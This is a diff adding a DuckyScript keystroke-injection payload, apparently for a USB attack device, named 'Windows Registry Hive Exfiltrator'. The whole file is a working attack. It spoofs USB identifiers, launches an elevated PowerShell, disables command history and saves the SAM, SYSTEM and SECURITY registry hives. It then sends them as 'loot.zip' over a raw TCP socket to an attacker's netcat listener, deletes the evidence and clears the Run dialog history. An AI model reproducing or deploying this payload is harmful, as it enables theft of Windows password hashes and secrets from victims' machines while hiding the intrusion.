@@ -1,0 +1,38 @@
+REM Title: Windows Registry Hive Exfiltrator
+REM Author: kipair
+REM Description: Extracts Windows registry hives (SAM, SYSTEM, SECURITY) and exfiltrates them via a netcat listener.
+
+REM Change IP and PORT variables according to the netcat listener.
+DEFINE #IP 0.0.0.0
+DEFINE #PORT 0000
+
+REM Randomizes device identifiers.
+VID_RANDOM
+PID_RANDOM
+MAN_RANDOM
+PRO_RANDOM
+SER_RANDOM
+
+CAPSLOCK_DISABLE
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT Y
+DELAY 2000
+STRINGLN_BLOCK
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+$C = $env:SystemDrive
+reg.exe save hklm\sam "$C\sam.save"
+reg.exe save hklm\system "$C\system.save"
+reg.exe save hklm\security "$C\security.save"
+Compress-Archive -Path "$C\sam.save", "$C\system.save", "$C\security.save" -DestinationPath "$C\loot.zip"
+$fileStream=[IO.File]::OpenRead("$C\loot.zip");$tcpClient=New-Object Net.Sockets.TcpClient("#IP",#PORT);$networkStream=$tcpClient.GetStream();$buffer=New-Object byte[] 8192;while(($bytesRead=$fileStream.Read($buffer,0,$buffer.Length))){$networkStream.Write($buffer,0,$bytesRead)};$fileStream.Close();$networkStream.Close();$tcpClient.Close()
+Remove-Item -Path "$C\loot.zip"
+Remove-Item -Path "$C\sam.save"
+Remove-Item -Path "$C\system.save"
+Remove-Item -Path "$C\security.save"
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+exit
+END_STRINGLN
